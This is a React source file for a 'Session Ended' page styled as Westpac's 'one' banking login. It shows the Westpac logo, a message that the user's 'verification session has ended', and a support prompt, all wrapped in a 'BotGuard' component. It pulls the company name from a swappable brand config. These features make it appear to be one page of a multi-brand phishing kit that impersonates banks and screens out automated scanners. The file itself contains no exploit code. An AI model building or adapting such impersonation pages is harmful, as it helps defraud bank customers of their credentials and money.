'use client';

/**
 * Westpac Terminated/Session Ended Page
 * Centered single-column layout matching Westpac design
 */

import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';
import { AlertTriangle } from 'lucide-react';

export default function TerminatedPage() {
  return (
    <BotGuard>
      {/* Logo Section */}
      <div className="logo-section">
        <img src="/brands/westpac/logo.svg" alt="Westpac" className="logo-section__icon" />
        <span className="logo-section__text">one</span>
      </div>

      {/* Content Container */}
      <div className="login-card">
        <h1 className="login-heading">Session Ended</h1>

        <div className="status-container">
          {/* Warning Icon - Centered */}
          <div className="status-icon-wrapper warning">
            <AlertTriangle strokeWidth={1.5} />
          </div>

          <p className="status-message-primary">
            Your verification session has ended.
          </p>

          <p className="status-message-secondary">
            This may be due to inactivity or the session was completed.
          </p>

          <p className="status-message-secondary" style={{ marginTop: '24px' }}>
            If you believe this was an error, please contact our support team for assistance.
          </p>

          <p className="status-footer">
            Need help? Contact {currentBrand.companyName} support
          </p>
        </div>
      </div>
    </BotGuard>
  );
}
